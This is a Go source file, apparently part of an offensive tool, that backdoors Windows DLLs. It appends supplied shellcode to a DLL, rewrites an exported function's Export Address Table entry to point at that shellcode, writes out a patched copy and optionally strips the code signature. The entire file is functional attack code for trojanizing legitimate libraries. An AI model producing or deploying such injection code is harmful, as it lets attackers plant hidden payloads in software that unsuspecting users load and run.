package injector

import (
	"encoding/binary"
	"fmt"
	"os"
	"strings"

	"github.com/Binject/debug/pe"
)

// IMAGE_FILE_DLL constant (not defined in Binject/debug)
const IMAGE_FILE_DLL = 0x2000

// injectEAT performs Export Address Table patching (DLL only)
// This method patches an exported function to point to shellcode
func (i *Injector) injectEAT(pePath string, shellcode []byte) (*Result, error) {
	// Open PE file
	file, err := pe.Open(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to open PE file: %v", err),
		}, err
	}
	defer file.Close()

	// Check if this is a DLL
	isDLL := false
	if file.Characteristics&IMAGE_FILE_DLL != 0 {
		isDLL = true
	}

	if !isDLL {
		return &Result{
			Success: false,
			Message: "EAT injection only works on DLL files",
		}, fmt.Errorf("not a DLL file")
	}

	// Read the original file
	data, err := os.ReadFile(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to read PE file: %v", err),
		}, err
	}

	// Get export directory
	var exportRVA uint32
	peOffset := binary.LittleEndian.Uint32(data[60:64])
	optHeaderOffset := peOffset + 4
	magic := binary.LittleEndian.Uint16(data[optHeaderOffset : optHeaderOffset+2])

	// Export directory is at index 0 in data directories
	if magic == 0x10b { // PE32
		numRvaAndSizes := binary.LittleEndian.Uint32(data[optHeaderOffset+92 : optHeaderOffset+96])
		if numRvaAndSizes > 0 {
			exportRVA = binary.LittleEndian.Uint32(data[optHeaderOffset+96 : optHeaderOffset+100])
		}
	} else if magic == 0x20b { // PE32+
		numRvaAndSizes := binary.LittleEndian.Uint32(data[optHeaderOffset+108 : optHeaderOffset+112])
		if numRvaAndSizes > 0 {
			exportRVA = binary.LittleEndian.Uint32(data[optHeaderOffset+112 : optHeaderOffset+116])
		}
	}

	if exportRVA == 0 {
		return &Result{
			Success: false,
			Message: "No export table found in DLL",
		}, fmt.Errorf("no export table")
	}

	// Convert export RVA to file offset
	exportOffset, err := rvaToFileOffsetFromData(data, exportRVA)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to find export directory: %v", err),
		}, err
	}

	// Parse export directory
	// Export Directory structure:
	// +0:  Characteristics (4 bytes)
	// +4:  TimeDateStamp (4 bytes)
	// +8:  MajorVersion (2 bytes)
	// +10: MinorVersion (2 bytes)
	// +12: Name RVA (4 bytes)
	// +16: Base (4 bytes)
	// +20: NumberOfFunctions (4 bytes)
	// +24: NumberOfNames (4 bytes)
	// +28: AddressOfFunctions RVA (4 bytes)
	// +32: AddressOfNames RVA (4 bytes)
	// +36: AddressOfNameOrdinals RVA (4 bytes)

	numFunctions := binary.LittleEndian.Uint32(data[exportOffset+20 : exportOffset+24])
	numNames := binary.LittleEndian.Uint32(data[exportOffset+24 : exportOffset+28])
	addrOfFunctionsRVA := binary.LittleEndian.Uint32(data[exportOffset+28 : exportOffset+32])
	addrOfNamesRVA := binary.LittleEndian.Uint32(data[exportOffset+32 : exportOffset+36])
	addrOfOrdinalsRVA := binary.LittleEndian.Uint32(data[exportOffset+36 : exportOffset+40])

	// Convert RVAs to file offsets
	addrOfFunctions, _ := rvaToFileOffsetFromData(data, addrOfFunctionsRVA)
	addrOfNames, _ := rvaToFileOffsetFromData(data, addrOfNamesRVA)
	addrOfOrdinals, _ := rvaToFileOffsetFromData(data, addrOfOrdinalsRVA)

	// Find the target function
	targetFuncIndex := -1
	targetFuncName := i.options.FuncName

	if targetFuncName == "" {
		// Use first exported function
		targetFuncIndex = 0
	} else {
		// Search for the specified function
		for i := uint32(0); i < numNames; i++ {
			nameRVA := binary.LittleEndian.Uint32(data[addrOfNames+i*4 : addrOfNames+i*4+4])
			nameOffset, _ := rvaToFileOffsetFromData(data, nameRVA)
			funcName := readNullString(data[nameOffset:])

			if strings.EqualFold(funcName, targetFuncName) {
				// Get ordinal
				ordinal := binary.LittleEndian.Uint16(data[addrOfOrdinals+i*2 : addrOfOrdinals+i*2+2])
				targetFuncIndex = int(ordinal)
				targetFuncName = funcName
				break
			}
		}
	}

	if targetFuncIndex < 0 || targetFuncIndex >= int(numFunctions) {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Function '%s' not found in exports", targetFuncName),
		}, fmt.Errorf("function not found")
	}

	// Find space for shellcode
	shellcodeOffset := len(data)
	alignedSize := (len(shellcode) + 15) & ^15

	// Extend file
	newData := make([]byte, len(data)+alignedSize)
	copy(newData, data)
	copy(newData[shellcodeOffset:], shellcode)

	// Calculate shellcode RVA
	shellcodeRVA, err := fileOffsetToRVA(file, uint32(shellcodeOffset))
	if err != nil {
		shellcodeRVA = uint32(shellcodeOffset)
	}

	// Get original function RVA
	origFuncRVAOffset := addrOfFunctions + uint32(targetFuncIndex)*4
	origFuncRVA := binary.LittleEndian.Uint32(newData[origFuncRVAOffset : origFuncRVAOffset+4])

	// Patch the export to point to shellcode
	binary.LittleEndian.PutUint32(newData[origFuncRVAOffset:], shellcodeRVA)

	// Output path
	outputPath := pePath + ".patched"

	// Write modified file
	if err := os.WriteFile(outputPath, newData, 0644); err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to write output file: %v", err),
		}, err
	}

	// Clear signature if not preserving
	if !i.options.PreserveSig {
		if err := ClearSignature(outputPath); err != nil {
			fmt.Printf("Warning: failed to clear signature: %v\n", err)
		}
	}

	return &Result{
		Success:    true,
		Message:    fmt.Sprintf("EAT injection successful. Patched '%s' (orig RVA: 0x%X -> new RVA: 0x%X)", targetFuncName, origFuncRVA, shellcodeRVA),
		OutputPath: outputPath,
	}, nil
}

// readNullString reads a null-terminated string
func readNullString(data []byte) string {
	var i int
	for i = 0; i < len(data) && data[i] != 0; i++ {
	}
	return string(data[:i])
}
